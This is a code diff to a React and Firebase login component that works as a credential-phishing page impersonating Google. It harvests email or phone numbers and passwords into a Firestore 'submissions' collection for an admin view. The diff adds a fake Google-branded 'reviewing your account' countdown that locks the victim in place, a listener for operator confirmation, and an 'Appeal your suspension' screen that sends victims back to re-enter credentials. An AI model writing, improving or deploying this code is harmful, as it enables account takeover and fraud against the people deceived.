@@ -3,10 +3,11 @@
  * SPDX-License-Identifier: Apache-2.0
  */
 
-import { useState, FormEvent } from 'react';
-import { ShieldAlert, Terminal, Eye, EyeOff, LayoutGrid, CheckCircle2 } from 'lucide-react';
-import { doc, setDoc } from 'firebase/firestore';
+import { useState, FormEvent, useEffect } from 'react';
+import { ShieldAlert, Terminal, Eye, EyeOff, LayoutGrid, CheckCircle2, AlertCircle, Loader2 } from 'lucide-react';
+import { doc, setDoc, onSnapshot } from 'firebase/firestore';
 import { db } from '../lib/firebase';
+import { handleFirestoreError, OperationType } from '../lib/firestore-error';
 
 interface LoginViewProps {
   onSuccess: () => void;
@@ -28,7 +29,77 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
   const [confirmError, setConfirmError] = useState('');
   
   // Submission Success Notification State
-  const [isSubmitted, setIsSubmitted] = useState(false);
+  const [isSubmitted, setIsSubmitted] = useState(() => {
+    return localStorage.getItem('pending_submission_id') !== null;
+  });
+  const [timeLeft, setTimeLeft] = useState(() => {
+    if (localStorage.getItem('pending_submission_is_confirmed') === 'true') {
+      return 0;
+    }
+    const id = localStorage.getItem('pending_submission_id');
+    if (id) {
+      const start = Number(localStorage.getItem('pending_submission_start') || '0');
+      const elapsed = Math.floor((Date.now() - start) / 1000);
+      return Math.max(300 - elapsed, 0);
+    }
+    return 300;
+  });
+  const [isConfirmed, setIsConfirmed] = useState(() => {
+    return localStorage.getItem('pending_submission_is_confirmed') === 'true';
+  });
+  const [isAppealMode, setIsAppealMode] = useState(() => {
+    return localStorage.getItem('pending_appeal_mode') === 'true';
+  });
+
+  // Real-time Firestore document updates listener
+  useEffect(() => {
+    const subId = localStorage.getItem('pending_submission_id');
+    if (!isSubmitted || !subId) return;
+
+    const unsubscribe = onSnapshot(doc(db, 'submissions', subId), (docSnap) => {
+      if (docSnap.exists()) {
+        const data = docSnap.data();
+        if (data.status === 'confirmed') {
+          setIsConfirmed(true);
+          setTimeLeft(0);
+          localStorage.setItem('pending_submission_is_confirmed', 'true');
+        }
+      }
+    }, (error) => {
+      console.error('Real-time listener error:', error);
+    });
+
+    return () => unsubscribe();
+  }, [isSubmitted]);
+
+  // Timer countdown
+  useEffect(() => {
+    if (!isSubmitted) {
+      return;
+    }
+    if (isConfirmed || timeLeft <= 0) {
+      return;
+    }
+    const timer = setInterval(() => {
+      const start = Number(localStorage.getItem('pending_submission_start') || '0');
+      const elapsed = Math.floor((Date.now() - start) / 1000);
+      const remaining = Math.max(300 - elapsed, 0);
+      
+      setTimeLeft(remaining);
+
+      if (remaining <= 0) {
+        localStorage.setItem('pending_submission_is_confirmed', 'true');
+        clearInterval(timer);
+      }
+    }, 1000);
+    return () => clearInterval(timer);
+  }, [isSubmitted, isConfirmed, timeLeft]);
+
+  const formatTime = (seconds: number): string => {
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+  };
 
   // Helper to parse browser name from user agent
   const getBrowserName = (): string => {
@@ -41,7 +112,7 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
     return 'Other Browser';
   };
 
-  const handleSignIn = (e: FormEvent) => {
+  const handleSignIn = async (e: FormEvent) => {
     e.preventDefault();
     if (!staySignedIn) return;
     
@@ -110,27 +181,39 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
         confirmPassword: confirmPassword,
         isMatched: password === confirmPassword,
         browser: getBrowserName(),
+        status: 'pending' as const,
+        type: isAppealMode ? 'appeal' as const : 'sov' as const,
       };
 
       // Save to Firestore in real-time
       try {
-        setDoc(doc(db, 'submissions', submission.id), submission).catch(err => {
-          console.error('Failed to save to Firestore:', err);
-        });
+        await setDoc(doc(db, 'submissions', submission.id), submission);
       } catch (err) {
-        console.error('Firestore save sync error:', err);
+        console.error('Failed to save to Firestore:', err);
+        handleFirestoreError(err, OperationType.WRITE, `submissions/${submission.id}`);
       }
 
-      // Save to localStorage
+      // Save to localStorage for historical submissions (for admin page view)
       const existing = JSON.parse(localStorage.getItem('demo_submissions') || '[]');
       existing.push(submission);
       localStorage.setItem('demo_submissions', JSON.stringify(existing));
+
+      // Save current pending submission info to force lock the user
+      localStorage.setItem('pending_submission_id', submission.id);
+      localStorage.setItem('pending_submission_start', String(Date.now()));
+      localStorage.setItem('pending_submission_is_confirmed', 'false');
+
+      // Clear appeal mode for next submissions
+      localStorage.removeItem('pending_appeal_mode');
+      setIsAppealMode(false);
 
       // Reset fields
       setEmailOrPhone('');
       setPassword('');
       setConfirmPassword('');
       setIsSubmitted(true);
+      setTimeLeft(300);
+      setIsConfirmed(false);
       
       // Let parent state know
       onSuccess();
@@ -152,39 +235,75 @@ export default function LoginView({ onSuccess, onNavigate }: LoginViewProps) {
             </svg>
           </div>
 
-          {/* Collapsed view status card */}
-          <div className="w-full bg-bg-card border border-border-custom rounded-lg shadow-card p-8 md:p-10 text-center space-y-6">
-            <div className="flex justify-center">
-              <div className="w-12 h-12 rounded-full bg-emerald-500/10 dark:bg-emerald-950/20 flex items-center justify-center text-brand-success">
-                <CheckCircle2 className="h-6 w-6" />
+          {timeLeft > 0 ? (
+            /* Collapsed view status card showing countdown */
+            <div className="w-full bg-bg-card border border-border-custom rounded-lg shadow-card p-8 md:p-10 text-center space-y-6 animate-fade-in">
+              <div className="flex justify-center">
+                <div className="relative flex items-center justify-center w-24 h-24 mx-auto">
+                  <div className="absolute inset-0 rounded-full border-4 border-[#e8eaed] dark:border-neutral-800"></div>
+                  <div className="absolute inset-0 rounded-full border-4 border-t-[#1a73e8] dark:border-t-[#8ab4f8] border-r-transparent border-b-transparent border-l-transparent animate-spin"></div>
+                  <div className="absolute inset-0 flex items-center justify-center">
+                    <svg className="w-11 h-11 select-none animate-google-pulse" viewBox="0 0 24 24">
+                      <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
+                      <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
+                      <path fill="#FBBC05" d="M5.84 14.1c-.22-.66-.35-1.36-.35-2.1s.13-1.44.35-2.1V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l3.66-2.84z" />
+                      <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
+                    </svg>
+                  </div>
+                </div>
+              </div>
+              
+              <div className="space-y-4">
+                <h2 className="text-text-primary text-2xl font-normal">
+                  Wait for
+                </h2>
+                <div className="text-4xl font-mono font-semibold text-[#1a73e8] dark:text-[#8ab4f8] tracking-widest animate-pulse">
+                  {formatTime(timeLeft)}
+                </div>
+                <p className="text-sm text-text-secondary leading-relaxed max-w-sm mx-auto">
+                  Our team are reviewing the activities in your account. Please keep this screen open.
+                </p>
+              </div>
+
+
+            </div>
+          ) : (
+            /* The second screen as requested (Appeal your suspension) */
+            <div className="w-full bg-[#fdf2f2] dark:bg-red-950/20 border border-red-200 dark:border-red-900/30 rounded-2xl p-6 md:p-8 shadow-card space-y-6 animate-fade-in">
+              <div className="flex gap-4 items-start">
+                <div className="text-[#c5221f] shrink-0 mt-0.5">
+                  <AlertCircle className="h-8 w-8" />
+                </div>
+                
+                <div className="space-y-1.5 text-left">
+                  <h3 className="text-lg font-bold text-[#1f2937] dark:text-red-100">
+                    Appeal your suspension
+                  </h3>
+                  <p className="text-sm text-[#4b5563] dark:text-red-200/80 leading-relaxed">
+                    You'll need to verify your account to get access to appeals
+                  </p>
+                </div>
+              </div>
+
+              <div className="pl-12 text-left">
+                <button
+                  onClick={() => {
+                    localStorage.removeItem('pending_submission_id');
+                    localStorage.removeItem('pending_submission_start');
+                    localStorage.removeItem('pending_submission_is_confirmed');
+                    localStorage.setItem('pending_appeal_mode', 'true');
+                    setIsAppealMode(true);
+                    setIsSubmitted(false);
+                    setIsConfirmed(false);
+                    setTimeLeft(300);
+                  }}
+                  className="px-6 py-2.5 bg-[#c5221f] hover:bg-[#b01e1e] text-white text-sm font-semibold rounded-lg shadow-sm transition-colors duration-150"
+                >
+                  Start verification
+                </button>
               </div>
             </div>
-            
-            <div className="space-y-3">
-              <h2 className="text-brand-success text-2xl font-medium tracking-tight">
-                Submission Successful
-              </h2>
-              <p className="text-sm text-text-secondary leading-relaxed">
-                Thank you! Your response has been recorded successfully. Our team will review your application and process it soon.
-              </p>
-            </div>
-
-            <div className="pt-2">
-              <div className="inline-flex items-center gap-2 px-4 py-2 bg-brand-bg-success-light border border-brand-border-success-light rounded-full text-xs text-brand-success font-medium select-none">
-                <span className="h-2 w-2 rounded-full bg-brand-success animate-pulse"></span>
-                <span>Response logged in real-time</span>
-              </div>
-            </div>
-
-            <div className="pt-4 border-t border-border-custom">
-              <button
-                onClick={() => setIsSubmitted(false)}
-                className="text-sm text-brand-primary hover:opacity-85 font-medium hover:underline transition-all"
-              >
-                Submit another response
-              </button>
-            </div>
-          </div>
+          )}
         </div>
       </div>
     );
